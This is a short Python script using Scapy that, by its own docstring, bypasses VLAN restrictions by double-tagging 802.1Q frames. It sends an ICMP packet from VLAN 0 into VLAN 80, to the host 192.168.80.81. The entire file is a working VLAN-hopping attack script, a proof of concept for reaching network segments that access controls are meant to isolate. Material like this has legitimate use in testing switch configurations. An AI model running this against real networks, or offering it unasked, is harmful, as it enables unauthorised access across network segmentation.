#!venv/bin/python

from scapy.all import *
from scapy.all import Ether, Dot1Q, IP, ICMP

"""
Bypass vlan restriction by encapsulation .1q into .1q
"""

source_interface = "Ethernet"

source_vlan = 0 # 0 or vlan number
destination_vlan = 80

destination_ip = "192.168.80.81"

pck = Ether()/Dot1Q(vlan=source_vlan)/Dot1Q(vlan=destination_vlan)/IP(dst=destination_ip)/ICMP()
pck.show()
sendp(pck, iface=source_interface)